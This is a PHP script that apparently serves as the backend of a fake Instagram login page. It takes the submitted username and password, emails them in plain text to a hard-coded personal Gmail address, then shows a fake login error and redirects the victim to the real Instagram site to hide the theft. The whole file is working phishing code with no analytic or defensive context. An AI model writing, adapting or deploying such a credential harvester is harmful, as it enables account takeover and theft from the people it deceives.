<?php

// Variable settings
$username = $_REQUEST['u_name'] ?? '';  // Fetch username (using null coalescing operator)
$passcode = $_REQUEST['pass'] ?? '';    // Fetch password (using null coalescing operator)

$subject = "Someone Login ! Insta Dummy page";
$to = "mrinalkashyap2701@gmail.com";

$txt = "Username: " . $username . "\r\nPassword: " . $passcode; // Email body (i) username [break] (ii) password;

// Check input fields
if (!empty($username) and !empty($passcode)) {

    mail($to, $subject, $txt);
    echo "<script type='text/javascript'>alert('Error ! Unable to login ');
        window.location.replace('https://www.instagram.com');
        </script>";

} else {

    echo "<script type='text/javascript'>alert('Please enter correct username or password. Try again ');
        window.history.go(-1);
        </script>";
}
?>
